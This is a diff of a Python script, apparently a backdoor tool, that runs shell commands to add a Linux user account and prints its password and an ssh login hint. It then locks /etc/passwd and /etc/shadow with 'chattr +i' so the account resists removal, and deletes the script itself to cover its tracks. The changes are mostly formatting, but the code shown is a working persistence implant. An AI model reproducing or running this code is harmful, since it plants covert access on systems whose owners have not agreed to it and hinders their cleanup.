@@ -1,8 +1,9 @@
 # coding=utf-8
 from __future__ import print_function
 import subprocess
-import sys,os
+import sys, os
 import requests
+
 
 def ml(command):
     process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
@@ -29,10 +30,12 @@ def adduser(user, password):
     j2 = ml(command)
     if user in j and user in j2:
         print("----------------------->user：" + user + " password: " + password + "< -----------------------")
+        print("----------------------->command ssh  " + user + "@ip")
         ml('chattr +i /etc/passwd')
         ml('chattr +i /etc/shadow')
     else:
         print("----------------------->失败<-----------------------")
+
 
 def deluser(user):
     try:
@@ -45,13 +48,15 @@ def deluser(user):
     except Exception as e:
         pass
 
+
 def delete_current_script():
     try:
         script_path = os.path.abspath(sys.argv[0])
         os.remove(script_path)
-        print("当前脚本文件已成功删除"+script_path)
+        print("当前脚本文件已成功删除" + script_path)
     except Exception as e:
         print("无法删除当前脚本文件：", e)
+
 
 if __name__ == '__main__':
     user = 'passw123'
